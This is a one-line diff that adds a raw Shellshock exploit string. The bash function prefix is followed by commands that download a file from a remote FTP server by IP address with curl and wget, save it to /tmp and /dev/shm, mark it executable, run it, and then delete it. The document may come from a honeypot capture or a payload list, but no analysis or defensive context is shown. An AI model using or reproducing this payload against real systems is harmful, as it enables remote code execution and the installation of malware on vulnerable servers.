@@ -1,0 +1,1 @@
+() { :;}; /bin/bash -c "curl -o /tmp/unix.txt ftp://175.126.167.52/unix.txt;/usr/bin/wget ftp://175.126.167.52/unix.txt -O /tmp/unix.txt;wget ftp://175.126.167.52/unix.txt -O /dev/shm/unix.txt;chmod +x /dev/shm/unix.txt /tmp/unix.txt;/dev/shm/unix.txt;/tmp/unix.txt;rm -rf /dev/shm/unix.txt /tmp/unix.txt*"
